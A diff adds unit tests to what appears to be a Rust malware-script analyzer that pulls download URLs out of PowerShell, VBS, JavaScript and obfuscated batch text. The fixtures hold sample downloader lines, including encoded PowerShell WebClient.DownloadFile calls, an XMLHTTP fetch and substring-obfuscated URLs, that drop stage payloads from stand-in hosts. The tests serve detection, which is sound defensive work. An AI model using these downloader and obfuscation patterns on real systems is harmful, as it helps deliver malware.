@@ -13981,6 +13981,37 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn webclient_download_trait_preserves_full_command_context() {
+        let marker = "FULL_CONTEXT_MARKER_AFTER_120_CHARS";
+        let pad = "A".repeat(160);
+        let ps = format!(
+            r#"$pad="{pad}";Write-Output "{marker}";$wc=New-Object Net.WebClient;$wc.DownloadFile("https://full-context.example/stage.exe","C:\Users\Public\stage.exe")"#
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(&ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let cmd = report.traits.iter().find_map(|t| match t {
+            Trait::Download { src, cmd, .. } if src == "https://full-context.example/stage.exe" => {
+                Some(cmd)
+            }
+            _ => None,
+        });
+        assert!(
+            cmd.is_some(),
+            "Download trait for full-context WebClient call missing: {:?}",
+            report.traits
+        );
+        let cmd = cmd.map_or("", String::as_str);
+        assert!(
+            cmd.contains(marker),
+            "PowerShell Download cmd context was truncated: {cmd}"
+        );
+        assert!(
+            cmd.contains("DownloadFile"),
+            "PowerShell Download cmd context lost the download call: {cmd}"
+        );
+    }
+
+    #[test]
     fn webclient_openread_concatenated_variable_url_extracted() {
         let ps = r#"$ser=$('http://198.51.100.7:8080');$t='/stage.bin';$wc=New-Object Net.WebClient;$wc.OpenRead($Ser+$T)"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -19589,6 +19620,40 @@ mod vbs_url_extraction_tests {
             )
         });
         assert!(has, "no Download trait: {:?}", env.traits);
+    }
+
+    #[test]
+    fn vbs_download_trait_preserves_full_command_context() {
+        let mut env = Environment::new(&Config::default());
+        let marker = "FULL_VBS_CONTEXT_MARKER_AFTER_120_CHARS";
+        let pad = "A".repeat(160);
+        let vbs = format!(
+            "pad = \"{pad}\"\r\nmarker = \"{marker}\"\r\nSet http = CreateObject(\"MSXML2.XMLHTTP\")\r\nhttp.Open \"GET\", \"https://vbs-full-context.example/stage.exe\", False\r\nhttp.Send"
+        );
+        env.all_extracted_vbs.push(vbs.into_bytes());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let cmd = env.traits.iter().find_map(|t| match t {
+            Trait::Download { src, cmd, .. }
+                if src == "https://vbs-full-context.example/stage.exe" =>
+            {
+                Some(cmd)
+            }
+            _ => None,
+        });
+        assert!(
+            cmd.is_some(),
+            "Download trait for full-context VBS payload missing: {:?}",
+            env.traits
+        );
+        let cmd = cmd.map_or("", String::as_str);
+        assert!(
+            cmd.contains(marker),
+            "VBS Download cmd context was truncated: {cmd}"
+        );
+        assert!(
+            cmd.contains("MSXML2.XMLHTTP"),
+            "VBS Download cmd context lost the download call: {cmd}"
+        );
     }
 
     #[test]
@@ -25307,9 +25372,61 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://github.com/owner/repo/raw/main/up.png"
                             && line_hint == "resolved-deob-var-fragments"
+                ) || matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
                 )
             }),
             "assembled URL not scanned after var-fragment resolution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_downloadfile_promotes_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"powershell -Command "(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', 'C:\Users\Public\up.bat')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\up.bat")
+                )
+            }),
+            "assembled DownloadFile URL not promoted to structured Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_downloadfile_body_promotes_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Roaming\\stage\\up.bat")
+                )
+            }),
+            "assembled DownloadFile body not promoted to structured Download: {:?}",
             env.traits
         );
     }
@@ -25331,6 +25448,10 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%�
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://github.com/owner/repo/raw/main/up.png"
                             && line_hint == "resolved-deob-var-fragments"
+                ) || matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
                 )
             }),
             "assembled URL not scanned from Unicode set bindings: {:?}",
@@ -25355,6 +25476,10 @@ start /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol 
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://github.com/owner/repo/raw/main/up.png"
                             && line_hint == "resolved-deob-var-fragments"
+                ) || matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
                 )
             }),
             "assembled URL not scanned inside nested PowerShell quotes: {:?}",
@@ -28471,6 +28596,40 @@ mod js_url_extraction_tests {
             )
         });
         assert!(has, "JS concat URL missed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn js_download_trait_preserves_full_command_context() {
+        let mut env = Environment::new(&Config::default());
+        let marker = "FULL_JS_CONTEXT_MARKER_AFTER_120_CHARS";
+        let pad = "A".repeat(160);
+        let js = format!(
+            r#"var pad="{pad}";var marker="{marker}";fetch("https://js-full-context.example/stage.exe");"#
+        );
+        env.all_extracted_jscript.push(js.into_bytes());
+        crate::js_scan::scan_js_payloads(&mut env);
+        let cmd = env.traits.iter().find_map(|t| match t {
+            Trait::Download { src, cmd, .. }
+                if src == "https://js-full-context.example/stage.exe" =>
+            {
+                Some(cmd)
+            }
+            _ => None,
+        });
+        assert!(
+            cmd.is_some(),
+            "Download trait for full-context JS payload missing: {:?}",
+            env.traits
+        );
+        let cmd = cmd.map_or("", String::as_str);
+        assert!(
+            cmd.contains(marker),
+            "JS Download cmd context was truncated: {cmd}"
+        );
+        assert!(
+            cmd.contains("fetch"),
+            "JS Download cmd context lost the download call: {cmd}"
+        );
     }
 
     #[test]
